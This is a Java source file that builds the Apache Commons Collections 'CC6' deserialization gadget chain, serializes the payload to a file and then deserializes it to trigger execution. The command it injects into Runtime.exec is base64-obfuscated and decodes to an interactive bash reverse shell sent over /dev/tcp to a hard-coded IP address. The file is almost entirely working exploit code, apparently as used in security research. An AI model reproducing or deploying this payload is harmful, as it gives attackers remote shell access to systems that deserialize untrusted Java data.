package Seri.CCGadgets;

import Seri.Utils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import static Seri.Utils.*;
import java.lang.Runtime;


public class CC6_HashSet {
    /*
	Gadget chain:
	    java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.ChainedTransformer.transform()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()

    by @matthias_kaiser
*/
    public static void main(String[] args) throws Exception {
        String[] cmd = {"bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE1Ni4yMzguMjMzLjk3LzkwOTkgMD4mMQ==}|{base64,-d}|{bash,-i}"};
//        Runtime.getRuntime().exec(cmd);
        Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[] { String.class, Class[].class },
                        new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke",
                        new Class[] { Object.class, Object[].class },
                        new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class },
                        cmd),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map inner = new HashMap();
        Map lazyMap = LazyMap.decorate(inner ,chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap ,"xx");

        HashSet hashSet = new HashSet(1);
        hashSet.add(tiedMapEntry);
        lazyMap.remove("xx");

        Utils.setValue(chainedTransformer ,"iTransformers" ,transformers);

        System.out.println(serialize(hashSet ,"bin/CC6.bin"));
        unserialize("bin/CC6.bin");

    }
}
